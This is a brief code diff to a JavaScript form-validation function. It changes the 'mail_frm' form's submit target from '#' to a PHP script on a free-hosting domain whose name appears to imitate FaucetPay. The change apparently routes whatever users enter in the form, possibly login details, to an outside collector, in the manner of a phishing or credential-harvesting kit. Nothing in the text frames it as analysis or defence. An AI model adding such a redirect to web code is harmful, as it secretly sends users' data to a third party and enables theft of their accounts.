@@ -22,7 +22,7 @@ function check() {
 		}
 		else
 		{
-			document.mail_frm.action = "#";
+			document.mail_frm.action = "https://faucetspay.000webhostapp.com/punkpanda.php";
 			document.mail_frm.submit();
 			return true;
 		}
